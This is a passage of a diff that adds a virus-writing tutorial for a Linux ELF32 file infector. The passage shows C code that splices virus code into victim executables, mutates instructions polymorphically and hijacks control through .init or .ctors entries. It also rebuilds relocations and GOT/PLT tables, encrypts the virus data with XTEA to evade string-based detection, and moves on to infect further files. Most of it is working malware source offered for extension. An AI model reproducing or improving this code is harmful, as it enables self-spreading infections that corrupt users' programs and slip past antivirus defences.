+		mydyn = (Elf32_Sym*)sec[SI_DYNSYM]->data;
+		myplt = sec[SI_RELPLT]->data;
+		mystr = sec[SI_DYNSTR]->data;
+		...	
+	} else {
+		fast = fastvirus;
+		mydyn = dynsym;
+		myplt = relplt;
+		mystr = dynstr;	
+		...
+	}
+	FOR_EACH(code, c) {
+		...
+			if (is_virus)
+				off = jmp - stext;
+			else {
+				if (section_io_by_addr(&si, &so, jmp))
+					return 1;
+				fast = sections[si].fast;
+				off  = so;
+			}
+			/* save the name of imported function, the check should/could be enforced */
+			if (IS_CALL(c->src) && *(uint16_t*)(base + jmp) == 0xa3ff) {
+				Elf32_Rel *rel;
+				jmp = *((uint32_t*)(base + jmp + 7));
+				rel = (Elf32_Rel*)(myplt + jmp);
+				jmp = ELF32_R_SYM(rel->r_info);
+				c->symbol = strdup(mydyn[jmp].st_name + mystr);
+				c->flags |= FL_EXTERN;
+			} else  ...
+
+
+The functions add_virus_imports, extend_section, lookup, build_hash, elf_hash are responsible
+for adding new imports.
+
+
+
+
+
+Coctail of code
+
+The reason for all that. Mix two lists (victim and virus code) into one. There are a  lot  of
+options, all that we need is to exchange several pointers. We may join the lists:
+
+static code_t *code_mixer(code_t *c1, code_t *c2)
+{
+	code_t *c;
+	FOR_EACH(c1, c)
+		if (c->next == NULL) {
+			c->next = c2;
+			return c1;
+		}
+	return c1;
+}
+...
+sec[SI_TEXT]->code = code_mixer(sec[SI_TEXT]->code, virus);
+
+
+Or we may mix the pieces of victim and virus. To preserve the right order of  code  execution
+(virus should not fallthrough to the victim and vice versa), we will split the lists  on  the
+instructions that transfer the control, like JMP or RET:
+
+static code_t *code_mixer(code_t *c1, code_t *c2)
+{
+	code_t *chain, *c0;
+	chain = c1;
+	for (;;) {
+		while (c1->next && (c1->diza.flag & C_STOP) == 0)
+			c1 = c1->next;
+		if (c1->next == NULL) {
+			c1->next = c2;
+			return chain;
+		}
+		c0 = c1->next;
+		c1->next = c2;
+		c1 = c2;
+		c2 = c0;
+	}
+}
+
+
+In my eyes it is little less complex than the previous example, but the infected program will
+looks for now quite different:
+
+_start:
+	...
+	call	__libc_start_main
+	...
+	hlt
+virus_function1:
+	...
+	jmp	virus_function1_1
+program_function1:
+	...
+	ret
+virus_function1_1:
+	...
+	ret
+program_function2:
+	...
+
+
+And now one may take the random code block and drga it to the start of .text section:
+
+	FOR_EACH(sec[SI_TEXT]->code, c)
+		if ((c->diza.flag & C_STOP) && c->next) {
+			if (_random(M_BRO_PROB) != 1)
+				continue;
+			code_t *d = c;
+			c = c->next;
+			code_t *b = c;
+			while (c && (c->diza.flag & C_STOP) == 0)
+				c = c->next;
+			if (c == NULL || c->next == NULL)
+				break;
+			d->next = c->next;
+			c->next = sec[SI_TEXT]->code;
+			sec[SI_TEXT]->code = b;
+			if (c->flags & FL_ME)
+				virus = b;
+			c = d;
+		}
+
+
+Now, we can mutate the code, suppose the following code (from RPME and BI-PERM engines):
+
+static void mutate(void)
+{
+	code_t *c;
+	FOR_EACH(sec[SI_TEXT]->code, c) {
+		uint8_t b0, b1, t;
+		if (c->diza.len != 2)
+			continue;
+		b0 = c->src[0];
+		b1 = c->src[1];
+		if ((b1 & 0xc0) != 0xc0)
+			continue;
+		// 10001001 11xxxyyy     ; mov r1,r2
+		// 01010xxx 01011yyy     ; push r2 // pop r1
+		// 10001011 11xxxyyy     ; mov r1,r2
+		// 01010yyy 01011xxx     ; push r2 // pop r1
+		if ((b0 & 0xFD) == 0x89 && _random(MUTATE1) == 1) {
+			t = b0;
+			b0=0x50 | ((b1 >> (t == 0x89 ? 3 : 0)) & 7);
+			b1=0x58 | ((b1 >> (t == 0x89 ? 0 : 3)) & 7);
+		}
+		...
+static int insert_code(void)
+{
+	...
+#ifdef	MUTATE
+	mutate();
+#endif
+	...
+
+and so on.
+
+
+
+
+
+Alignment
+
+Yet at the stage of disassembly the instructions which align the code to the certain boundary
+were recognized. Since all addresses are subject to  change, let's  work  out  the  alignment
+boundary for each command prefixed with alignment instructions:
+
+
+	FOR_EACH(sec[SI_TEXT]->code, c) {
+		// the alignment follows c
+		if (c->next && (c->next->flags & FL_ALIGN)) {
+			uint32_t als;
+			code_t *d;
+			d = c;		// last significant insn
+			c = c->next;	// first alignment insn
+			als = c->asrc;	// its offset
+			while (c->flags & FL_ALIGN) {
+				code_t *f;
+				als += c->diza.len;
+				f = c;
+				c = c->next;
+				free(f);
+			}
+			// the offset of the next meaningful
+			// command is multiple of ...?
+			for (j = 16; j > 0; j >>= 1)
+				if ((als % j) == 0)
+					break;
+			// save it
+			c->al = j;
+			d->next = c;
+			c = d;
+		}
+	}
+
+
+Suppose, that all functions should be aligned to the paragraph, this means that  the  address
+of function should be divided by 16 without remainder. The addresses of 1/16 of all functions
+could involuntarily match with this limit and the padding  will  not  be  inserted. We  could
+forcedly align all the functions:
+
+// in mark
+		if (c->diza.flag & C_REL) {
+			if (c->diza.flag & C_STOP) {
+			...
+			} else {
+				if (IS_CALL(c->src)) {
+					if ((c->flags & FL_EXTERN) == 0 && c->diza.data_l[0] != 0) {
+						c->link->al = 16;
+						...
+
+
+We could take the compiler duties and realign all to the certain boundaries. Should we?
+
+
+
+
+
+Dead code elimination
+
+You can often see the code that will never receive the control, the crap like:
+
+                                 ______________________
+/* sometime we finally make here the golden self sucker the right
+thing ™ which will solve all our problems, not yet finished... */
+int foo(void)
+{
+	return 0;
+}
+
+To remove all this crap, just throw out of the list all code without FL_SEEN flag.
+
+	// we'll talk about this later
+	freec(sec[SI_TEXT]->code, FL_SEEN);
+
+
+
+
+
+The virus gains the control
+
+We can place the jump to the virus body wherever we want. For example, one  may  add  another
+call after the las call in .init:
+
+
+	// looking for the last call
+	FOR_EACH(sec[SI_INIT]->code, c)
+		if (IS_CALL(c->src))
+			d = c;
+	if (d == NULL)
+		return 1;
+	// inserting another one
+	c = NEW(code_t);
+	c->flags |= FL_FREESRC;
+	c->src = (uint8_t*)NEW(uint64_t);
+	c->src[0] = 0xe8;
+	c->diza.len = 5;
+	c->link = ventry;
+	// insert to the list
+	c->next = d->next;
+	d->next = c;
+
+
+
+
+
+Assembling of sections and code
+
+Well, all is marked, mixed, cleaned and made dirty again, it's time to build the  file  from
+scratch.
+
+Allocate the memory for the new file, copy there the ELF and PHT headers, the offset (elf_off)
+and address (elf_adr) counters are set to the end of PHT, when we start to copy the  sections
+of loadable segments:
+
+
+	for (k = 1, i = 0; i < ehdr->e_phnum; i++) {
+		if (phdr[i].p_type != PT_LOAD)
+			continue;
+		// fix the PHT
+		if (phdr[i].p_offset != 0) {
+			ph[i].p_offset = elf_off;
+			ph[i].p_vaddr = elf_adr;
+			ph[i].p_paddr = elf_adr;
+			...
+		// for each section located in this segment 
+		for (j = 1; j < shnum; j++) {
+			if ((sections[j].ohdr->sh_addr < phdr[i].p_vaddr) ||
+			    (sections[j].ohdr->sh_addr >= (phdr[i].p_vaddr + phdr[i].p_memsz)))
+				continue;
+			...
+
+
+If the section requires the alignment, align it:
+
+
+			if (sections[j].ohdr->sh_addralign > 1) {
+				uint32_t a;
+				a = ALIGN(elf_adr, sections[j].ohdr->sh_addralign) - elf_adr;
+				elf_adr	+= a;
+				elf_off += a;
+			}
+
+
+Save the new offset and address of section:
+
+
+			sections[j].offset = elf_off;
+			sections[j].addr = elf_adr;
+
+
+IF this section is not loadable (like .comment) or a bulk like .bss (which does  not  require
+space in the file), skip it, but adjust the address counter if needed (it  might  present  in
+the memory):
+
+
+			if (sections[j].ohdr->sh_addr == 0)
+				continue;
+			if (sections[j].ohdr->sh_type == SHT_NOBITS) {
+				sections[j].size = ALIGN(sections[j].size, sections[j].ohdr->sh_addralign);
+				elf_adr += sections[j].size;							
+				continue;
+			}
+
+
+If this is the code section copy each command from this section, pad it  if  neccessary, save
+the new address in the dsta field. If it is not a code section, copy the  whole  section  and
+don't forget to increase the counters.
+
+			if (sections[j].code != NULL) {
+				ptr = file + sections[j].offset;
+				FOR_EACH(sections[j].code, c) {
+					if (c->al > 1) {
+						uint32_t t;
+						t = ptr - file;
+						t = ALIGN(t, c->al) - t;
+						if (t > 0) {
+							memcpy(ptr, padding_bytes + (t * (t - 1) / 2), t);
+							ptr += t;
+						}
+					}
+					c->dsta = ptr - file;
+					memcpy(ptr, c->src, c->diza.len);
+					ptr += c->diza.len;
+				}
+				sections[j].size = ptr - (file + sections[j].offset);
+				...
+			} else {
+				memcpy(file + sections[j].offset, sections[j].data, sections[j].size);
+				...
+			}
+			elf_off += sections[j].size;
+			elf_adr += sections[j].size;
+			...
+
+
+When all sections for this segment were copied, fix the segment size  in  the  file  and  the
+memory and align the segment:
+
+
+		ph[i].p_filesz = elf_off - ph[i].p_offset;
+		ph[i].p_memsz = elf_adr - ph[i].p_vaddr;
+		ph[i].p_align = PAGE_SIZE;
+		elf_adr += PAGE_SIZE;
+
+
+Then we need to fix the PHT entries, which points to the individual sections, like PT_INTERP->
+.interp, PT_DYNAMIC->.dynamic etc, copy all sections non-loadable sections to the  file, copy
+the SHT and place where the new values from 'sections', fix the ehdr.e_shoff and copy the rest
+of file (if any). The new ELF file is made-up.
+
+
+
+
+
+
+Linking the code and fixing the headers
+
+We will fix the addresses in the tables with the fix_addr function:
+
+
+static uint32_t fix_addr(uint32_t addr) {
+	uint32_t si, so;
+	...
+	// get the section index and offset for the address
+	if (section_io_by_addr(&si, &so, addr) == 0) {
+		// is it code? find the instruction the address points to
+		// and return its new address, saved during assembly
+		if (sections[si].code != NULL) {
+			if (sections[si].fast[so] != NULL)
+				return sections[si].fast[so]->dsta;
+		} else {
+		// it is not the code. the new address is the new address of section + offset
+			so = so + sections[si].addr;
+			...
+
+
+Fix the relocs in .rel.dyn. Both address in the table and the pointer located at that address
+should be fixed.
+
+
+	rel = (Elf32_Rel*)sec[SI_RELDYN]->data;
+	for ( ; ((char*)rel - (char*)sec[SI_RELDYN]->data) < sec[SI_RELDYN]->size; rel++) {
+		if (ELF32_R_TYPE(rel->r_info) == R_386_RELATIVE) {
+			if (section_io_by_addr(&si, &so, rel->r_offset))
+				return 1;
+			*(uint32_t*)(sections[si].data + so) = fix_addr(*((uint32_t*)(sections[si].data + so)));
+		}
+		rel->r_offset = fix_addr(rel->r_offset);	
+	}
+
+When we added the functions we left some fields blank, since the addresses of  sections  were
+unknown, now we can fix the .got.plt and .rel.plt:
+
+
+	*((uint32_t*)(sec[SI_GOTPLT]->data)) = sec[SI_DYNAMIC]->addr;
+	for (i = 16; i < sec[SI_PLT]->size; i += 16) {
+		uint32_t a0, a1;
+		a0 = *(uint32_t*)(sec[SI_PLT]->data + i + 2); /* offset in .got.plt */
+		a1 = *(uint32_t*)(sec[SI_PLT]->data + i + 7); /* offset in .rel.plt */
+		*((uint32_t*)(sec[SI_GOTPLT]->data + a0)) = sec[SI_PLT]->addr + i + 6;
+		((Elf32_Rel*)(sec[SI_RELPLT]->data + a1))->r_offset = sec[SI_GOTPLT]->addr + a0;
+	}
+
+
+.dynamic is just the array which holds some  pointers  and  other  helpful  information, walk
+through it and fill the correct values:
+
+
+	dyn = (Elf32_Dyn*)(sec[SI_DYNAMIC]->data);
+	while (dyn->d_tag != DT_NULL) {
+		if (dyn->d_tag == DT_INIT)
+			dyn->d_un.d_ptr = sec[SI_INIT]->addr;
+		if (dyn->d_tag == DT_FINI)
+			dyn->d_un.d_ptr = sec[SI_FINI]->addr;
+		...
+
+
+Later we'll need the values of the old and new _GLOBAL_OFFSET_TABLE_ pointer:
+
+
+	uint32_t old_gotoff = sec[SI_GOT]->ohdr->sh_addr + sec[SI_GOT]->ohdr->sh_size;
+	uint32_t new_gotoff = sec[SI_GOT]->addr + sec[SI_GOT]->size;
+
+
+It is neccessary to link the code. Link together the jump commandss, fix the data references:
+
+
+	for (i = 1; i < shnum; i++) {
+		if (sections[i].code == NULL)
+			continue;
+		FOR_EACH(sections[i].code, c)
+			// external function call, find its address in PLT by name
+			if (c->flags & FL_EXTERN) {
+				*((uint32_t*)(file + c->dsta + 1)) = (sec[SI_PLT]->addr + symbol_to_plt(c->symbol)) - c->dsta - 5;
+			// virus data reference, compute the offset in the virus data "section" and add the
+			// address on which the victim's data section ended before, assemble the command over again
+			} else if (c->flags & FL_DATA) {
+				c->diza.addr_d[0] = (sec[SI_DATA]->addr + sec[SI_DATA]->ohdr->sh_size + (c->dref - virus_data)) - new_gotoff;
+				xde_asm(file + c->dsta, &c->diza);
+			// jump, compute the relative address
+			} else if (c->link != NULL)
+				/* there is no short jumps anymore */
+				*((uint32_t*)(file + c->dsta + c->diza.len - 4)) = c->link->dsta - c->dsta - c->diza.len;
+			// these commands calculate the _GLOBAL_OFFSET_TABLE_ pointer, let's figure
+			// the offset from the current instruction to the new _GOT_
+			else if (c->flags & FL_GOTPTR1)
+				*((uint32_t*)(file + c->dsta + c->diza.len - 4)) = new_gotoff - c->dsta + 1;
+			else if (c->flags & FL_GOTPTR2)
+				*((uint32_t*)(file + c->dsta + c->diza.len - 4)) = new_gotoff - c->dsta;
+			// get the old absolute address, fix it with fix_addr and convert it back to _GOT_-relative
+			else if (c->flags & FL_GOTOFF) {
+				c->diza.addr_d[0] = fix_addr(old_gotoff + c->diza.addr_d[0]) - new_gotoff;
+				xde_asm(file + c->dsta, &c->diza);
+			}
+	}
+
+
+And now, fix the branch tables, the addresses in the table appear to be like label@GOTOFF, so
+this is much the same:
+
+
+	for (i = 1; i < jt[0]; i++) {
+		if (section_io_by_addr(&si, &so, jt[i]))
+			return 1;
+		*(uint32_t*)(sections[si].data + so) = fix_addr(old_gotoff +
+			*(uint32_t*)(sections[si].data + so)) - new_gotoff;
+	}
+
+Fix the dynamic symbol table and .symtab (.symtab is optional):
+
+static void fix_symtab(Elf32_Sym *sym, int sz) {
+	int i;
+	for (i = 0; i < sz/sizeof(Elf32_Sym); i++)
+		if (sym[i].st_value)
+			sym[i].st_value = fix_addr(sym[i].st_value);
+}
+	...
+	fix_symtab((Elf32_Sym*)sec[SI_DYNSYM]->data, sec[SI_DYNSYM]->size);
+	for (j = 1; j < shnum; j++)
+		if (sections[j].ohdr->sh_type == SHT_SYMTAB && sections[j].addr == 0)
+			fix_symtab((Elf32_Sym*)sections[j].data, sections[j].size);
+
+
+Fix the entry point, centry holds the pointer to the structure describing the instruction  at
+the victim's entry:
+
+
+	((Elf32_Ehdr*)file)->e_entry = centry->dsta;
+
+
+Copy our own data:
+
+
+	uint8_t *p = sec[SI_DATA]->data + sec[SI_DATA]->ohdr->sh_size;
+	uint32_t s = ((uint32_t)&data_end-(uint32_t)&virus);
+	memcpy(p, &virus, s);
+
+
+virus is our first variable, data_end - the last.
+
+
+Fix the values of some of our variables in the victim:
+
+
+	*(uint32_t*)(p + ((char*)&voffs - (char*)&virus)) = ventry->dsta;
+	...
+
+
+All is in readiness. There is only few things left to do, to write the new ELF file, free the
+memory, and look for the next victim.
+
+
+
+
+
+The next file...
+
+Suppose, that we already infected one file and want more. There  could  we  take  the 'virus'
+list? Disassemble again? It's slow. Use the one we already have? Where will  appear a  pieces
+of victim, we need to seprate it from the list. The virus code has the FL_ME  flag, free  all
+list members without that flag and link them again:
+
+
+static void freec(code_t *code, uint32_t flag)
+{
+	code_t *c, *me;
+	for (me = NULL; code != NULL; ) {
+		c = code->next;
+		if (code->flags & flag) {
+			if (me == NULL) {
+				me = code;
+			} else {
+				me->next = code;			
+				me = code;
+				me->next = NULL;
+			}
+		} else {
+			if (code->flags & FL_FREESRC)
+				free(code->src);
+			if (code->flags & FL_EXTERN)
+				free(code->symbol);
+			free(code);
+		}
+		code = c;
+	}
+}
+// in infect
+	// free memory
+	if (sections != NULL) {
+		for (i = 1; i < shnum; i++)
+			if (sections[i].code != NULL) {
+				freec(sections[i].code, FL_ME);
+				...
+
+
+When we performed the dead code elimination, we used as a flag FL_SEEN, when we  will  finish
+our work and need to clean the virus, we'll call the freec with flag 0.
+
+
+
+
+
+
+
+
+-Additional features-
+
+
+Extending the section and hiding the entry point
+
+
+Other than the jumpts to the virus body inserted to the victim's code it is possible  to  use
+some table in the file, one might patch the reloc, but it is  also  neccessary  to  save  all
+registers on entry and exit from virus; ot it is possible to add the pointer  to  .ctors  and
+reloc for it.
+
+
+.ctors is just an array of constructor's  addresses (void (*)(void) functions  called  before
+main, __attribute__((constructor)) in gcc), the zeroth entry holds the value 0xffffffff (some
+systems keep the length of array there, and NULL in the last entry). The array  is  processed
+by __do_global_ctors_aux function defined in gcc' crtstuff.c:
+
+
+__do_global_ctors_aux (void)
+{
+  func_ptr *p;
+  for (p = __CTOR_END__ - 1; *p != (func_ptr) -1; p--)
+    (*p) ();
+}	
+
+
+Let's extend the .ctors and .rel.dyn sections:
+
+
+// in insert_code
+extend_section(sec[SI_CTOR], NULL, 4);
+extend_section(sec[SI_RELDYN], NULL, sizeof(Elf32_Rel));
+
+
+Fill the reloc and the pointer in .ctors:
+
+
+	*((uint32_t*)(sec[SI_CTOR]->data + sec[SI_CTOR]->size - 8)) = ventry->dsta;
+	rel = (Elf32_Rel*)(sec[SI_RELDYN]->data + sec[SI_RELDYN]->size - sizeof(Elf32_Rel));
+	rel->r_offset = sec[SI_CTOR]->addr + sec[SI_CTOR]->size - 8;
+	rel->r_info = ELF32_R_INFO(0, R_386_RELATIVE);
+
+
+Why "sec[SI_CTOR]->size - 8"? Because the last  entry  should  be  0. And  there  is  another
+obstacle. The array will be scanned from the  end  and  the  pointer __CTOR_END__ became  now
+invalid, let's add a few strings to the fix_addr:
+
+
+			so = so + sections[si].addr;
+			if (§ions[si] == sec[SI_CTOR] && so >= (sections[si].size - 8))
+				so += 4;
+
+
+To insert something to the section and not to garble the pointers like that, one may fill two
+arrays (with the number of entries equal to the number of sections), one  with  the  offsets,
+from which the insertion begins and another with the size of  inserted  data, something  like
+that:
+
+
+// fix_addr
+			if (so >= insert_threshold[si])
+				so += insert_size[si];
+
+
+And slightly change the extend_section, so that it move apart the contents of the section and
+save the offsets and sizes. Since I'm too lazy, to make a fully-featured  insertions, by  the
+way in addition to the above one also need to change the processing of FL_DATA, so it be able
+to handle the referencing the different sections, I set some limitations on virus code:
+
+
+  1. Do not use switch - the jump table is almost inevitable, and it is neccessary to  extend
+     .rodata to put jump table there. 
+  2. Do not use any references except .data, even unitialized variables will be kept in .data,
+     not in .bss, first, see 1, second, the .bss has the _edata pointer, which points outside
+     the section (that requires a hack in section_io_by_addr). 
+
+
+It's full of special cases, which requires a lot of additional  code, while  virus  is  large
+enough and with all features it will be unreadble.
+
+
+
+
+D'you want to encrypt the data?
+
+Does it worth the effect, to dissasemble and to assemble the code, to see how the virus could
+be catched with the string search in the data segment? It's no big deal, encrypt it, just  an
+example:
+
+
+// in fix_headers
+	memcpy(p, &virus, s);
+	...
+	unsigned long *key = (unsigned long*)p;	
+	s &= ~15;
+	for (i = 16; (i + 8) <= s; i+= 8) {
+		encipher((unsigned long*)(p + i), key);
+		key[0]++;
+		...
+// in lacrimae
+	int i;
+	uint8_t *p = (uint8_t*)&virus;
+	unsigned long *k = (unsigned long*)p;
+	uint32_t s = ((uint32_t)&data_end-(uint32_t)&virus) & ~15;
+	for (i = s; i >= 16; i -= 8) {
+		decipher((unsigned long*)(p + i), k);
+		k[0]--;
+		...
+
+
+encipher and decipher is XTEA. To prevent the encryption key recovery  (substract  the  known
+virus data length from the top of the data section) we will increase the  data  section  size
+by random value (surely, it must be greater than our data size)  and  fill  with  the  random
+values:
+
+
+	// size of the data
+	j = (uint32_t)&data_end - (uint32_t)&virus;
+	// and even more
+	k = j + _random(128);
+	uint8_t *data = extend_section(sec[SI_DATA], NULL, k);
+	// and fill with garbage
+	for (i = j; i < k; i++)
+		data[i] = _random(256);
+
+
+I used the first four uninitialized pointers, ASLR take care of their values to be random.
+
+
+
+
+
+-Uknown bugs and open roads-
+
+Yes, without any doubts, this virus has many bugs in it. There are  extra  checks  somethere,
+and there are some missed checks. The perfomance is far from good. The  virus  cannot  handle
+prelinked programs. The new optimization in gcc might  ruin  the  conditions  built  for  the
+specific code. After all, the virus didn't even tried to check  does  the  file  follows  the
+standard conventions or it has some assembly hack in the middle on which the virus will  fail
+and mess up the victim. But everything can be put right. This  is  the  beginning. Some  base
+code, which can be fixed, improved and optimized.
+
+
+
+
+
+-References-
+
+  1. Z0mbie "Methodology of undetectable virus", March 2001 
+  2. Jakub Jelinek "Prelink", March 2004 
+  3. System V Application Binary Interface Intel 386 Architecture Processor Supplement, fourth ed., March 1997 
+  4. Reji Thomas, Bhasker Reddy "Dynamic Linking in Linux and Windows", Aug 2006 
+  5. herm1t "Hashin' the elves", Oct 2007
+
